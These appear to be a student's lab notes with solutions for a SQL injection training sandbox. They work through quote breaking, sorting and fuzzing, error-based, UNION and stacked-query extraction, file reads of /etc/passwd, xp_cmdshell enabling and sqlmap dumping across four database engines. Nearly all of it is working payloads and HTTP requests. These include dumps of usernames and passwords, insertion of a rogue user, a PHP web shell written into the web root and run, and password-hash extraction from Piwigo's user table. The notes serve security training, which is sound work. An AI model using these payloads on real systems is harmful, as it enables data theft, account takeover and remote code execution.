
###### SQL Injection


```
10 or id=11 -> MySQL, Oracle, SQL Server, PostgreSQL

```
String Delimiters

Injecting single quote

```
SELECT * FROM menu WHERE name = 'Tostadas''

```
Sol:

```
admin' or '1'='1

```

Closing Out Strings and Functions
Example payload:

```
foo') or id=11-- 
```

Payload becomes:

```
SELECT * FROM menu WHERE LOWER(name) = LOWER('foo') or id=11-- ') 

SELECT * FROM menu WHERE LOWER(name) LIKE LOWER('%foo') or id=11-- %')
```
Sol:
```
foo') or 1=1 --   Oracle
foo') or 1=1# MySQL
foo') or 1=1--  SQL Server
foo') or 1=1--  Postgres SQL
```

###### Sorting

Can be used to find no of columns.

```
SELECT name, price FROM menu ORDER BY name

SELECT name, price FROM menu ORDER BY 2

```
Sol:

```
POST /discovery/api/sorting HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/sorting
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 27
Connection: close

db=mysql&sort=id'&order=asc

```
MSSQL:

```
POST /discovery/api/sorting HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/sorting
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 27
Connection: close

db=mssql&sort=id;&order=asc
```

Used ; for mssql and postgres. ' for MySQL and Oracle.



###### Boundary Testing

```
SELECT * FROM menu ORDER BY 4 desc;

SELECT * FROM menu ORDER BY 5 desc; -> grnerates error as there is only 4 cols.

```


Sol:

```
POST /discovery/api/boundaries HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/boundaries
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 23
Connection: close

db=mysql&sort=5&order=2

```

###### Fuzzing

```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&id=FUZZ" -u http://sql-sandbox/api/intro

```
Sol:

postgres and mssql

```
POST /discovery/api/fuzzing HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/fuzzing
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 38
Connection: close

db=postgres&name=OR&sort=id&order=asc)

```

MySQL and oracle
```
POST /discovery/api/fuzzing HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/fuzzing
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 41
Connection: close

db=oracle&name=admin&sort=id&order=asc'
```



##### Exploiting SQL Injection

###### Error-based Payloads
force erroneous data type conversions

SQL Server

```
cast(@@version as integer)

```
Postgres SQL

```
cast(version() as integer)
```
MySQL

```
extractvalue('',concat('>',version()))
```
In this payload, we call the extractvalue() function and pass in a blank string as the first parameter (the XML fragment). For the second parameter, we use the concat() function to concatenate the greater-than symbol (>) and version(). We can use many different values for the first value in the concat() function as long as the resulting value is not a valid XPath expression. We want to avoid values that start with a forward slash (/), a period (.), the at character (@), or a completely alphanumeric string since these values would start a valid XPath expression. We are using the greater-than symbol (>) because it is a delimiter in XML and cannot be part of a valid XML node.


Oracle

```
to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```

Error Based Sol:

```
POST /exploit/api/error HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/exploit/error
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 60
Connection: close

inStock=cast(@@version as integer)&name=as&sort=id&order=asc

```
```
POST /exploit/api/error HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/exploit/error
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 57
Connection: close

inStock=1&name=mop%27+or+%271%27%3D%271&sort=id&order=asc
```

For MS SQL Server

```
1+or+1=1

inStock=cast(@@version+as+varchar)&name=&sort=id&order=asc

cast(@@version+as+varchar)


SELECT string_agg(name, ', ') FROM sys.databases;

cast((SELECT+string_agg(name,+',')+FROM+sys.databases;)+as+varchar)

cast((SELECT+string_agg(name,+',')+FROM+sys.databases+where+name+like+'e%';)+as+varchar)

cast((SELECT+string_agg(name,+',')+FROM+sys.databases+where+name+not+in+('master');)+as+varchar)

select string_agg(table_name, ',') from app.information_schema.tables

cast((select+string_agg(table_name,+',')+from+app.information_schema.tables;)+as+varchar)

cast((select+string_agg(table_name,+',')+from+exercise.information_schema.tables;)+as+varchar)

select string_agg(column_name, ',') from app.information_schema.columns where table_name='secretTable'

cast((select+string_agg(column_name,+',')+from+app.information_schema.columns+where+table_name='secretTable';)+as+varchar)

cast((select+string_agg(column_name,+',')+from+exercise.information_schema.columns+where+table_name='secrets';)+as+varchar)

select flag from app.dbo.secretTable;

cast((select+flag+from+app.dbo.secretTable;)+as+varchar)

cast((select+flag+from+exercise.dbo.secrets;)+as+varchar)


cast((select+flag+from+app.dbo.flags;)+as+varchar)

cast((select+flag+from+exercise.dbo.flags;)+as+varchar)

```



1
(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver15 ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Null_(SQL) ↩︎

3
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html ↩︎

4
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_extractvalue ↩︎

5
(Wikipedia, 2021), https://en.wikipedia.org/wiki/XPath ↩︎

6
(Oracle, 2016), https://docs.oracle.com/database/121/ARPLS/d_xmlgen.htm#ARPLS69856 ↩︎

7
(Swissky, et al, 2021) https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md ↩︎

8
(NetSPI, 2019), https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql ↩︎


###### UNION-based Payloads

```
SELECT id, name, description, price FROM menu UNION ALL SELECT id, username, password, 1 FROM users;

```

Input:

```
0 UNION ALL SELECT id, username, password, 0 from users
```


Query:
```
SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users
```

```

')  or ('1'='1

z')) union select  version(),2,3,4--   

```

Payload:

```

name=z%27%29%29+union+select+VERSION()%2C2%2C3%2C4--+&sort=id&order=asc

```
Union based sol:

mysql

```
')  or ('1'='1
'))--+ 

select group_concat(distinct(table_schema) separator ', ') from information_schema.tables;


select * from tablename where lower(name) like lower(concat('%',user_input,'%')); 




z'))+union+select+version(),2,3,4--+

z'))+union+select+concat('a','b'),2,3,4--+

z'))+union+select+(select+group_concat(distinct(table_schema)+separator+',+')+from+information_schema.tables;),2,3,4--+

z'))+union+select+(select+group_concat(distinct(table_name)+separator+',+')+from+information_schema.tables+where+table_schema='app';),2,3,4--+

z'))+union+select+(select+group_concat(distinct(table_name)+separator+',+')+from+information_schema.tables+where+table_schema='exercise';),2,3,4--+

z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+from+information_schema.columns+where+table_schema='app'+and+table_name='hiddenTable';),2,3,4--+

z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+from+information_schema.columns+where+table_schema='exercise'+and+table_name='secrets';),2,3,4--+

```
SQLI in login username:

```
ad' UNION ALL SELECT NULL,1,NULL,NULL,NULL,NULL#

ad' UNION ALL SELECT NULL,version(),NULL,NULL,NULL,NULL#

ad' UNION ALL select 1,group_concat(distinct(table_schema) separator ', '),1,1,1,1 from information_schema.tables#


ad' UNION ALL select 1,group_concat(distinct(table_name) separator ', '),1,1,1,1 from information_schema.tables where table_schema='piano_protocol'#


ad' UNION ALL select 1,group_concat(distinct(column_name) separator ', '),1,1,1,1 from information_schema.columns where table_schema='piano_protocol' and table_name='users'#


ad' UNION ALL select 1,concat(username," ",password ),1,1,1,1 from piano_protocol.users#

```


###### Stacked Queries

PostgreSQL for demonstration purposes, Microsoft SQL Server also supports stacked queries

```
10; select * from users;

10; insert into users(id, username, password) values (1001,'hax','hax');

```

Sol:

```
POST /exploit/api/stacked HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/exploit/stacked
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 65
Connection: close

name=mop&sort=name&order=asc%3bselect+datname+from+pg_database%3b
```

```
name=mop&sort=name&order=asc%3bselect+version()%3b

name=mop&sort=name&order=asc%3bselect+current_user%3b

name=mop&sort=name&order=asc%3bselect+datname+from+pg_database%3b

name=mop&sort=name&order=asc%3bselect+table_name+from+exercise.information_schema.tables+where+table_schema%3d'public'%3b

name=mop&sort=name&order=asc%3bselect+column_name+from+exercise.information_schema.columns+where+table_name='flags'%3b

name=mop&sort=name&order=asc%3bselect+flag+from+flags%3b

```
###### Reading and Writing Files

For PostgreSQL
Specifically, we can use COPY FROM to insert data into a table from a file or COPY TO to copy data to a file from a table.

Using stacked queries.

```
create table tmp(data text);
copy tmp from '/etc/passwd';
select * from tmp;
```
We can delete the table we created with "drop table tmp;".

```
SELECT pg_read_file('/etc/passwd')
```

In MySQL, we can read files using the LOAD_FILE() function. However, there is a catch. MySQL has a secure_file_priv3 system variable that restricts which directories can be used to read or write files.

We can check the value of this variable with 
```
SELECT @@GLOBAL.secure_file_priv;
```
Setting the value to an empty string ("") is the same as leaving the value blank.
Since secure_file_priv is enabled (set to a non-null value) in our sandbox application, we will be restricted to reading and writing files in /var/lib/mysql-files.

```
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'

SELECT LOAD_FILE('/var/lib/mysql-files/test.txt') 

```

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Web_shell ↩︎

2
(The PostgreSQL Global Development Group, 2021), https://www.postgresql.org/docs/13/sql-copy.html ↩︎

3
(Oracle, 2021), https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv ↩︎

Solution:

```
SELECT pg_read_file('/tmp/flag.txt') -> postgresql

SELECT LOAD_FILE('/var/lib/mysql-files/flag.txt') - > mysql

```

###### Remote Code Execution

In Microsoft SQL Server, the xp_cmdshell1 function takes a string and passes it to a command shell for execution.

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO
```
Once xp_cmdshell is enabled, we can call it using the following syntax:

```
EXECUTE xp_cmdshell 'command to run here';
```


1
(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15 ↩︎

2
(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15 ↩︎

###### Extra Mile

```
http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,2

http://sql-sandbox/extramile/index.php?id=1 union all select 1,2

http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20group_concat(distinct(table_schema)%20separator%20%27,%20%27)%20from%20information_schema.tables)

http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20group_concat(distinct(table_name)%20separator%20%27,%20%27)%20from%20information_schema.tables%20where%20table_schema=%27app%27)

http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20group_concat(distinct(column_name)%20separator%20%27,%20%27)%20from%20information_schema.columns%20where%20table_schema=%27app%27%20and%20table_name=%27flags%27)

http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20flag%20from%20flags)

```

Sol:

```
http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20@@GLOBAL.secure_file_priv)

http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(SELECT%20LOAD_FILE(%27/root/flag.txt%27))

http://sql-sandbox/extramile/index.php?id=1%20union%20all%20SELECT%203,%22%3C?%20system($_REQUEST[%27cmd%27]);%20?%3E%22%20INTO%20OUTFILE%20%22/var/www/html/d.php%22

http://sql-sandbox/extramile/d.php?cmd=cat%20/root/flag.txt
```

###### SQLMap

```
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order"

sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump

```

Sqlmap has many other features, such as the ability to attempt Web Application Firewall (WAF) bypasses and execute complex queries to automate the complete takeover of a server. For example, using the os-shell parameter will attempt to automatically upload and execute a remote command shell on the target system. However, this feature only works if the database writes to the application's web root and the application is written in ASP, ASPX, JSP, or PHP.

We can instruct sqlmap to ignore any previous sessions with the --flush-session flag.

Sol

```
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order"

sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump

sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=postgres&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=postgresql --dump --flush-session --level 3

sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbs --flush-session

sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mssql -D sqlmap --dump --force-pivoting


sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle --dump --flush-session


sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --flush-session

sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --level 3

 
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --dbs --level 3

sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --dump -D SQLMAP --level 3
```



The group_concat() function is unique to MySQL. Current versions of Microsoft SQL Server3 and PostgreSQL4 have a very similar STRING_AGG() function. Additionally, current versions of Oracle DB have a LISTAGG()5 function that is similar to the STRING_AGG() functions.


Using ExtractValue() with group_concat()

```
asc, extractvalue('',concat('>',(
    select group_concat(table_schema) 
    from (
      select table_schema 
      from information_schema.tables 
      group by table_schema) 
    as foo)
    )
  )

```

```
,+extractvalue('',concat('>',version()))

,+extractvalue('',concat('>',(select+group_concat(table_schema)+from+(select+table_schema+from+information_schema.tables+group+by+table_schema)+as+foo)))

```

Updated payload to extract:

```
asc, extractvalue('',concat('>',(
  select group_concat(table_name) 
  from (
    select table_name from information_schema.tables
    where table_schema='piwigo') 
  as foo)
  )
)
```

```
,+extractvalue('',concat('>',(select+group_concat(table_name)+from+(select+table_name+from+information_schema.tables+where+table_schema='piwigo')+as+foo)))
```

Updated payload with LIMIT and OFFSET values:

```
asc, extractvalue('',concat('>',(
	select group_concat(table_name) 
	from (
		select table_name 
		from information_schema.tables 
		where table_schema='piwigo' 
		limit 2 offset 2) 
	as foo)
	)
)
```

```
,+extractvalue('',concat('>',(select+group_concat(table_name)+from+(select+table_name+from+information_schema.tables+where+table_schema='piwigo'+limit+2+offset+2)+as+foo)))
```

keep increasing offset


at offset 32 we get piwigo_users table

Payload to extract column names for piwigo_users table:
```
asc, extractvalue('',concat('>',(
	select group_concat(column_name) 
	from (
		select column_name 
		from information_schema.columns 
		where table_schema='piwigo' and table_name='piwigo_users') 
	as foo)
	)
)
```

```
,+extractvalue('',concat('>',(select+group_concat(column_name)+from+(select+column_name+from+information_schema.columns+where+table_schema='piwigo'+and+table_name='piwigo_users')+as+foo)))
```

Microsoft SQL Server has a nearly identical SUBSTRING()8 function and Oracle DB has a SUBSTR()9 function that takes the same parameters. PostgreSQL has two different functions for substrings.10 The MySQL SUBSTRING() function follows the same parameter format as the SUBSTR() function. The SUBSTRING() function must include a from or for keyword in the function call.

Payload to extract password values:
```
asc, extractvalue('',concat('>',(select substring(password,1,32) from piwigo_users limit 1 offset 0)))
```
```
,+extractvalue('',concat('>',(select+substring(password,1,32)+from+piwigo_users+limit+1+offset+0)))
'''
Get additional chars:

```
,+extractvalue('',concat('>',(select+substring(password,30,32)+from+piwigo_users+limit+1+offset+0)))
```
1
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html ↩︎

2
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html#function_group-concat ↩︎

3
(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/t-sql/functions/string-agg-transact-sql?view=sql-server-ver15 ↩︎

4
(The PostgreSQL Global Development Group, 2021), https://www.postgresql.org/docs/13/functions-aggregate.html ↩︎

5
(Oracle, 2016), https://docs.oracle.com/cd/E11882_01/server.112/e41084/functions089.htm#SQLRF30030 ↩︎

6
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/select.html ↩︎

7
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_substring ↩︎

8
(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/t-sql/functions/substring-transact-sql?view=sql-server-ver15 ↩︎

9
(Oracle, 2021), https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions162.htm ↩︎

10
(The PostgreSQL Global Development Group, 2021), https://www.postgresql.org/docs/current/functions-string.html ↩︎

11
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Hash_function ↩︎

